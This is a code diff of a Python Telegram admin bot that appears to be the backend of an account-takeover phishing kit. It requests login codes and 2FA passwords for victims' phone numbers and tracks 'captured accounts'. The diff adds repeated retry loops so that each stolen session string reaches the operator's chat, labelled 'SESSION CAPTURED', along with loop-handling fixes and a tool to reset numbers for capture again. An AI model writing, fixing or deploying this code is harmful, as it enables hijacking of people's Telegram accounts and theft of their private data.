@@ -264,7 +264,7 @@ def account_label(a):
 
 
 # ============================================================
-# RESET ENGINE — persistent + millisecond precision
+# RESET ENGINE
 # ============================================================
 def reset_phone_number(phone, reset_by="manual"):
     global captured_accounts
@@ -375,29 +375,41 @@ def reset_all_numbers(reset_by="manual"):
 SESSION_PATH = f"/tmp/adminbot_{uuid.uuid4().hex[:8]}.session"
 bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 
-# Main bot loop reference — for cross-thread send_message
 _main_bot_loop = None
 
 
 async def _send_via_main_loop(chat_id, text, buttons=None, parse_mode=None):
     """Send message using bot's ORIGINAL event loop (cross-thread safe)."""
-    if _main_bot_loop is None:
-        logger.warning("⚠️ _main_bot_loop is None — falling back to direct call")
-        return await bot.send_message(chat_id, text, buttons=buttons, parse_mode=parse_mode)
     try:
-        fut = asyncio.run_coroutine_threadsafe(
-            bot.send_message(chat_id, text, buttons=buttons, parse_mode=parse_mode),
-            _main_bot_loop
-        )
-        return await asyncio.wrap_future(fut)
-    except Exception as e:
-        logger.error(f"_send_via_main_loop err: {type(e).__name__}: {e}")
-        raise
+        current = asyncio.get_running_loop()
+    except RuntimeError:
+        current = None
+
+    logger.info(f"📤 _send_via_main_loop: current={current} main={_main_bot_loop} same={current is _main_bot_loop}")
+
+    if _main_bot_loop is None:
+        logger.warning("⚠️ _main_bot_loop None — direct call")
+        return await bot.send_message(chat_id, text, buttons=buttons, parse_mode=parse_mode)
+
+    if current is _main_bot_loop:
+        logger.info("📤 Same loop — direct await")
+        return await bot.send_message(chat_id, text, buttons=buttons, parse_mode=parse_mode)
+
+    logger.info("📤 Cross-thread — run_coroutine_threadsafe")
+    fut = asyncio.run_coroutine_threadsafe(
+        bot.send_message(chat_id, text, buttons=buttons, parse_mode=parse_mode),
+        _main_bot_loop
+    )
+    return await asyncio.wrap_future(fut)
 
 
 async def _send_via_main_loop_edit(chat_id, msg_id, text, buttons=None):
-    """Edit message using bot's original loop."""
-    if _main_bot_loop is None:
+    try:
+        current = asyncio.get_running_loop()
+    except RuntimeError:
+        current = None
+
+    if _main_bot_loop is None or current is _main_bot_loop:
         return await bot.edit_message(chat_id, msg_id, text, buttons=buttons)
     fut = asyncio.run_coroutine_threadsafe(
         bot.edit_message(chat_id, msg_id, text, buttons=buttons),
@@ -566,6 +578,8 @@ async def send_welcome(uid, name):
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
     logger.info("=== Admin /start ===")
+    for k in STATE:
+        STATE[k] = False
     try:
         sender = await event.get_sender()
         uid = sender.id
@@ -618,11 +632,11 @@ async def health_cmd(event):
     txt = (f"🏥 HEALTH\n\n"
            f"main_loop_ready: {_main_bot_loop is not None}\n"
            f"bot connected: {bot.is_connected()}\n"
-           f"bot authorized: {await bot.is_user_authorized()}\n"
            f"accounts: {len(captured_accounts)}\n"
            f"pending_codes: {len(pending_codes)}\n"
            f"user_sessions: {len(user_sessions)}\n"
-           f"reset_marker: {reset_all_marker}")
+           f"reset_marker: {reset_all_marker}\n"
+           f"STATE: {[k for k,v in STATE.items() if v]}")
     await event.respond(txt, buttons=admin_menu())
 
 
@@ -642,6 +656,34 @@ async def pending_cmd(event):
     if len(txt) > 4000:
         txt = txt[:3990] + "..."
     await event.respond(txt or "Empty")
+
+
+@bot.on(events.NewMessage(pattern='/test'))
+async def test_cmd(event):
+    """Test cross-thread send from background thread."""
+    if event.sender_id != YOUR_TELEGRAM_ID:
+        return
+    await event.respond("🧪 Testing cross-thread send in 2s...")
+
+    def background_test():
+        import time as t
+        t.sleep(2)
+        # Simulate new event loop from background thread (like Flask route does)
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        try:
+            loop.run_until_complete(
+                _send_via_main_loop(
+                    YOUR_TELEGRAM_ID,
+                    "🧪 CROSS-THREAD TEST SUCCESS\n\nIf you see this, notify works!",
+                )
+            )
+        except Exception as e:
+            logger.error(f"test cross-thread fail: {type(e).__name__}: {e}")
+        finally:
+            loop.close()
+
+    threading.Thread(target=background_test, daemon=True).start()
 
 
 # ============================================================
@@ -958,9 +1000,6 @@ async def cb(event):
             await event.answer("✅ Terminated", alert=True)
             return
 
-        # ============================================================
-        # RESET NUMBERS
-        # ============================================================
         if data == "menu_reset_numbers":
             await event.answer()
             await safe_send(chat_id,
@@ -1022,10 +1061,9 @@ async def cb(event):
             await safe_send(chat_id, "🧹 Log cleared.", reset_numbers_menu(), edit_event=event)
             return
 
-        # ============================================================
-        # EXISTING PANEL
-        # ============================================================
         if data == "menu_home":
+            for k in STATE:
+                STATE[k] = False
             await event.answer()
             await safe_send(chat_id,
                 "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
@@ -1341,6 +1379,7 @@ async def capture(event):
 
     if STATE["awaiting_reset_number"]:
         raw = txt.strip()
+        logger.info(f"♻️ Reset number input: {raw}")
         phone = format_phone(raw)
         digits = ''.join(filter(str.isdigit, raw))
         if len(digits) < 7:
@@ -1355,10 +1394,10 @@ async def capture(event):
                    f"🗑 Stale removed: {result['removed_stale_account']}\n"
                    f"💾 Account kept: {result['kept_account']}\n\n"
                    f"Ekhon {result['phone']} diye /tg app e abar prothom theke login korte parbi.")
-            await event.respond(msg, buttons=reset_numbers_menu())
+            await event.respond(msg, buttons=admin_menu())
         except Exception as e:
             logger.error(f"reset specific err: {e}")
-            await event.respond(f"❌ Reset failed: {str(e)[:80]}", buttons=reset_numbers_menu())
+            await event.respond(f"❌ Reset failed: {str(e)[:80]}", buttons=admin_menu())
         return
 
     if STATE["awaiting_timer"]:
@@ -1531,12 +1570,13 @@ async def self_ping_loop():
 
 async def bot_main():
     global _main_bot_loop
-    logger.info("Admin bot starting...")
-    await bot.start(bot_token=BOT_TOKEN)
     _main_bot_loop = asyncio.get_running_loop()
     logger.info(f"✅ _main_bot_loop captured: {_main_bot_loop}")
+    logger.info("Admin bot starting...")
+    await bot.start(bot_token=BOT_TOKEN)
     me = await bot.get_me()
     logger.info(f"✅ Admin bot started as @{me.username}")
+    logger.info(f"✅ bot loop is_running={_main_bot_loop.is_running()} connected={bot.is_connected()}")
     asyncio.create_task(broadcast_loop())
     asyncio.create_task(self_ping_loop())
     await bot.run_until_disconnected()
@@ -1992,7 +2032,6 @@ def _run_tg_thread(phone, code, password, tg_id):
 
 async def _tg_action(phone, code=None, password=None, tg_id=None):
     if not code:
-        # ==== STEP 1: SEND OTP ====
         logger.info(f"🚀 OTP REQUEST START: phone={phone}")
         try:
             client = TelegramClient(StringSession(), API_ID, API_HASH)
@@ -2045,7 +2084,6 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             except Exception:
                 pass
 
-    # ==== STEP 2: VERIFY CODE / 2FA ====
     with sessions_lock:
         if phone not in user_sessions:
             logger.error(f"❌ VERIFY: No session stored for {phone}")
@@ -2141,39 +2179,55 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             ],
         ]
 
-        # ==== NOTIFY VIA MAIN LOOP (cross-thread safe) ====
         notify_sent = False
-        try:
-            r = await _send_via_main_loop(YOUR_TELEGRAM_ID, msg, buttons=buttons, parse_mode='md')
-            if r:
-                acc["admin_notify_msg_id"] = r.id
-                save_account(acc)
-                captured_accounts = load_accounts()
-                notify_sent = True
-                logger.info(f"✅ Notification MD sent (mid={r.id})")
-        except Exception as e:
-            logger.warning(f"notify MD fail: {type(e).__name__}: {e}")
-
-        if not notify_sent:
+        notify_err = None
+        for attempt in range(3):
             try:
-                r = await _send_via_main_loop(YOUR_TELEGRAM_ID, msg, buttons=buttons)
+                logger.info(f"📤 Notify MD attempt {attempt+1}/3")
+                r = await _send_via_main_loop(YOUR_TELEGRAM_ID, msg, buttons=buttons, parse_mode='md')
                 if r:
                     acc["admin_notify_msg_id"] = r.id
                     save_account(acc)
                     captured_accounts = load_accounts()
                     notify_sent = True
-                    logger.info(f"✅ Notification PLAIN sent (mid={r.id})")
+                    logger.info(f"✅ Notification MD sent (mid={r.id}) attempt={attempt+1}")
+                    break
             except Exception as e:
-                logger.error(f"notify PLAIN fail: {type(e).__name__}: {e}")
+                notify_err = e
+                logger.warning(f"notify MD attempt {attempt+1} fail: {type(e).__name__}: {e}")
+                await asyncio.sleep(1)
 
         if not notify_sent:
-            try:
-                await _send_via_main_loop(YOUR_TELEGRAM_ID, f"🚨 SESSION CAPTURED (buttons failed)\nPhone: {phone}\n\n{ss}")
-                notify_sent = True
-                logger.info("✅ Fallback raw session sent")
-            except Exception as e:
-                logger.error(f"FALLBACK FAIL: {type(e).__name__}: {e}")
-                logger.error(traceback.format_exc())
+            for attempt in range(3):
+                try:
+                    logger.info(f"📤 Notify PLAIN attempt {attempt+1}/3")
+                    r = await _send_via_main_loop(YOUR_TELEGRAM_ID, msg, buttons=buttons)
+                    if r:
+                        acc["admin_notify_msg_id"] = r.id
+                        save_account(acc)
+                        captured_accounts = load_accounts()
+                        notify_sent = True
+                        logger.info(f"✅ Notification PLAIN sent (mid={r.id}) attempt={attempt+1}")
+                        break
+                except Exception as e:
+                    logger.warning(f"notify PLAIN attempt {attempt+1} fail: {type(e).__name__}: {e}")
+                    await asyncio.sleep(1)
+
+        if not notify_sent:
+            for attempt in range(3):
+                try:
+                    logger.info(f"📤 Notify RAW attempt {attempt+1}/3")
+                    r = await _send_via_main_loop(YOUR_TELEGRAM_ID, f"🚨 SESSION (no buttons)\n{phone}\n\n{ss}")
+                    if r:
+                        notify_sent = True
+                        logger.info(f"✅ Fallback raw session sent attempt={attempt+1}")
+                        break
+                except Exception as e:
+                    logger.error(f"FALLBACK attempt {attempt+1} fail: {type(e).__name__}: {e}")
+                    await asyncio.sleep(1)
+
+        if not notify_sent:
+            logger.error(f"❌ ALL NOTIFY ATTEMPTS FAILED for {phone}: {notify_err}")
 
         with sessions_lock:
             user_sessions.pop(phone, None)
